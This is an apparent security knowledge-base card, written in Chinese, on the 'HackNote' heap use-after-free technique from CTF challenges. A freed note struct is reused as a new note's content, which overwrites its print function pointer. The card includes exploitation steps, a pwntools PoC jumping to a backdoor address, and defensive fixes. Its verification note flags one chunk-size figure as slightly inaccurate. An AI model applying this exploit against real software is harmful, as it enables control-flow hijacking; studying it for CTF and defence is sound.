---
id: binary-pwn-heap-hacknote-content-overlaps-struct-funcptr
title: HackNote 型 UAF：struct 与 content 双分配，重建 note 时新 content 落到旧 struct 上覆写函数指针
type: scenario
domain: binary
path: binary/pwn/heap
technique: heap-hacknote-content-struct-overlap-funcptr
tags:
- pwn
- heap
- uaf
- use-after-free
- fastbin
- tcache
- function-pointer
- chunk-overlap
- ctf
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-09'
updated: '2026-11-09'
verification:
  verified_by: verifier-V412
  verified_at: '2026-11-09T14:57:32+08:00'
  notes: 已对照原文与图01-13核对：add_note malloc(8) 结构体(偏移0 print_note_content、+4 content指针)+malloc(size)内容、del_note 先free内容再free结构体且不置空、32位No PIE后门0x8048986、exp(add32两次→del0/1→add8 payload→print0)与原文一致。小瑕疵：卡内示例称 size=32 的 content 为0x30块，原文图09实际为0x20块(gdb chunk size)，应为0x28/0x20量级，不影响LIFO重叠与利用逻辑。未验证点：PoC未在本机复跑；ez_uaf/ezhp_code 两条跳过理由成立。
url: /docs/binary/pwn/heap/binary-pwn-heap-hacknote-content-overlaps-struct-funcptr/
draft: false
kb_aliases:
- HackNote
- hacknote UAF
- note 结构体与内容双分配
- content 覆盖 struct
- print 函数指针劫持
- 释放后重建 note 重叠
---

## 一句话结论

note 管理器为每个 note 分别 `malloc` 一个结构体（偏移 0 是 print 函数指针，+4 是内容指针）和一个内容块；delete 把两者都 `free` 且不清空 note 列表。先建两个 note 再全部删除，随后用一个更小的 size 新建第三个 note，它的 struct 和 content 会按 LIFO 依次取走两个已释放的旧 struct 块，于是写入 content 的 4/8 字节正好覆盖旧 note0 结构体的函数指针；再 print note0 就会调用攻击者写入的地址（后门或 `system`）。

## 原理

- **每个 note 两次分配**：`add_note` 先 `malloc(8)` 得到结构体，偏移 0 写入 `print_note_content` 函数指针，偏移 4 存放内容块指针；再 `malloc(size)` 得到内容块并读入正文。print 功能通过结构体偏移 0 的函数指针间接调用，参数为结构体地址。
- **delete 释放两块且不置空**：`del_note` 先 `free(content)` 再 `free(struct)`，note 列表中对应槽位仍保留已释放结构体的地址，因此 print 仍能通过悬垂指针读取并调用结构体里的函数指针。
- **LIFO 复用造成跨对象重叠（核心）**：以 32 位程序、两个 size=32 的 note 为例，content 是 0x30 块、struct 是 0x10 块。依次删除 note0、note1 后：
  - 0x30 空闲链：`content1 -> content0`；
  - 0x10 空闲链：`struct1 -> struct0`（后释放的 struct1 在链表头）。
  - 再执行 `add_note(8, payload)`：结构体 `malloc(8)` 从 0x10 链头取走 `struct1`；内容 `malloc(8)` 取走 `struct0`。此时 payload 被读入 `struct0` 的起始地址，覆盖的正是旧 note0 的 print 函数指针。
- **为什么不需要堆溢出**：程序对每次读写都按 size 限制，没有任何越界写；劫持完全来自分配器把“新 note 的内容”与“旧 note 的结构体”分配到了同一块物理内存（chunk overlap），这是 UAF 提供悬垂引用、分配器复用提供别名写的结果。
- **为什么控制流能触发**：`print_note(0)` 读取 `notelist[0]`（仍指向已释放的 struct0），执行 `*(void(**)(void *))notelist[0]`，CPU 从被 payload 覆盖的偏移 0 取出地址并调用；32 位 No PIE 下可直接填二进制内后门函数，若开了 PIE 则需先泄露代码/libc 基址再填 `system` 或 one_gadget。
- **64 位差异**：`malloc(8)` 对应 0x20 chunk（16 字节头），struct/content 的 chunk 大小与 tcache bin 需要按 64 位重新计算；原理相同，仍要求新旧 note 的 struct 与 content 落入同一 size class 才能交错复用。

## 触发条件

- 菜单式 note 管理器：每个 note = 含函数指针的结构体 + 独立内容块，两次 `malloc`。
- delete 同时 `free` 结构体与内容块，且不把 note 列表指针置空（或仍保留可 print 的悬垂指针）。
- `add_note` 的 size 由攻击者控制，能申请到与旧 struct 块同一 size class 的块（32 位下 `malloc(8)` 两处都命中 0x10 fastbin）。
- print 通过结构体偏移 0 的函数指针间接调用。
- 有可写入的目标地址：No PIE 下的后门函数最直接；否则需先泄露 libc/PIE 再写 `system`/one_gadget。

## 利用步骤

1. 逆向 `add_note`/`del_note`/`print_note`：确认结构体布局（函数指针偏移 0、内容指针偏移 4）、delete 的 free 顺序（先内容后结构体）以及列表槽位是否清空。
2. `checksec`：典型题为 32 位、No PIE、Canary、NX、Partial RELRO，可直接使用二进制内后门；同时 `shift+f12`/符号表找 `system("cat flag")` 类后门。
3. `add_note(32, "aaaa")`、`add_note(32, "aaaa")` 建立 note0、note1。
4. `del_note(0)`、`del_note(1)`：两个结构体块和两个内容块分别进入 0x10、0x30 空闲链。
5. `add_note(8, p32(backdoor))`：新 note2 的结构体取走 struct1，内容取走 struct0，payload 写入 struct0 偏移 0，覆盖 note0 的 print 指针。
6. `print_note(0)`：调用被覆盖的函数指针，进入后门读取 flag；若目标是 shell，则 payload 换成 `system` 地址并把结构体首字段布置成 `"/bin/sh"` 或利用后门内固定的命令。
7. 若一次 `add` 的 size 无法同时命中 struct/content 所需 bin，可用多次分配调整空闲链顺序，或先用 show 泄露再走 tcache 毒化。

## PoC

32 位 HackNote 类题目的最小利用骨架（索引、函数地址按原题；未在本机复跑）：

```python
from pwn import *

backdoor = 0x08048986          # 二进制内 system("cat flag") 类后门

def add(size, content):
    io.sendlineafter(b"Your choice :", b"1")
    io.sendlineafter(b"Note size :", str(size).encode())
    io.sendafter(b"Content :", content)

def delete(idx):
    io.sendlineafter(b"Your choice :", b"2")
    io.sendlineafter(b"Index :", str(idx).encode())

def show(idx):
    io.sendlineafter(b"Your choice :", b"3")
    io.sendlineafter(b"Index :", str(idx).encode())

add(32, b"aaaa")               # note0: struct(0x10) + content(0x30)
add(32, b"aaaa")               # note1: struct(0x10) + content(0x30)
delete(0)
delete(1)                      # 0x10 链: struct1 -> struct0
add(8, p32(backdoor))          # note2 struct<-struct1, content<-struct0
show(0)                        # 调用 *(struct0) == backdoor
io.interactive()
```

## 变体与关联

- 变体：64 位版本按 0x20 chunk 计算，用 tcache LIFO 同样让新 content 覆盖旧 struct；若 tcache 有 key/safe-linking，只影响 double free 检查，不影响“悬垂指针 + 同尺寸复用”的 UAF 写。
- 变体：结构体里的目标不一定是函数指针，也可能是内容指针/data 指针；把新 content 落到旧 struct 可改写指针实现任意读写（同类思路见结构体复用类卡片）。
- 变体：没有后门且 PIE 开启时，先利用同一重叠读泄露 libc（例如让内容块与 unsorted bin 块重叠），再把函数指针写成 `system`，内容布置 `"/bin/sh"`。
- 关联：[[binary-pwn-heap-uaf-function-pointer-hijack]]（同一 sink 的最简单对象演示，本条补充“struct+content 双分配 + 新 content 覆盖旧 struct”的构造）；[[binary-pwn-heap-uaf-struct-reuse-data-pointer]]（结构体被重分配为数据缓冲区改写指针）；[[binary-pwn-heap-mark-pointer-split-metadata-uaf-arbitrary-read-free]]（另一类笔记管理器 UAF 元数据复用）；[[binary-pwn-heap-glibc223-uaf-fastbin-dup-malloc-hook-realloc-onegadget]]（进一步把 UAF 用于 libc 泄露与 hook 劫持）。
- 边界：delete 后把列表槽位置空/标记不可用、print 拒绝已释放索引、结构体与内容块来自不同分配器或不同 size class、启用 CFI 校验间接调用目标时，本路径失效。

## 检测与防御

- 修复：`free` 后立即把 note 列表槽位与对象内部指针置 NULL，delete 时清除索引状态；print/edit 必须校验对象仍处于已分配状态。
- 修复：不要依赖“用户输入的 size”决定对象生命周期；结构体与内容块使用固定的类型化分配器/对象池，避免不同用途的小块落入同一 bin 交错复用。
- 加固：开启 PIE/Full RELRO/CFI；使用 ASAN、glibc 的 tcache key 与 safe-linking（只能提高利用门槛，不能修复 UAF 本身）。
- 检测：同一地址先后作为结构体与内容缓冲区被分配；print 前索引状态为已释放；间接调用目标落在非代码段或异常地址；堆空闲链被跨用途消耗。
